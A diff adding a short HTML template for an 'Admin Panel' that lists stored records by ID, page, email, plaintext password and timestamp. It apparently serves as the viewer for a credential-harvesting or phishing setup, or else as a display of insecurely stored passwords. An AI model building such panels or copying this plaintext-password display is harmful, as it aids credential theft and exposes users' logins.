@@ -1,0 +1,25 @@
+{% extends "base.html" %}
+{% block content %}
+
+<h2>Admin Panel</h2>
+<table border="1" cellpadding="8">
+    <tr>
+        <th>ID</th>
+        <th>Page</th>
+        <th>Email</th>
+        <th>Password</th>
+        <th>Time</th>
+    </tr>
+
+    {% for row in data %}
+    <tr>
+        <td>{{ row.id }}</td>
+        <td>{{ row.page }}</td>
+        <td>{{ row.email }}</td>
+        <td>{{ row.password }}</td>
+        <td>{{ row.timestamp }}</td>
+    </tr>
+    {% endfor %}
+</table>
+
+{% endblock %}
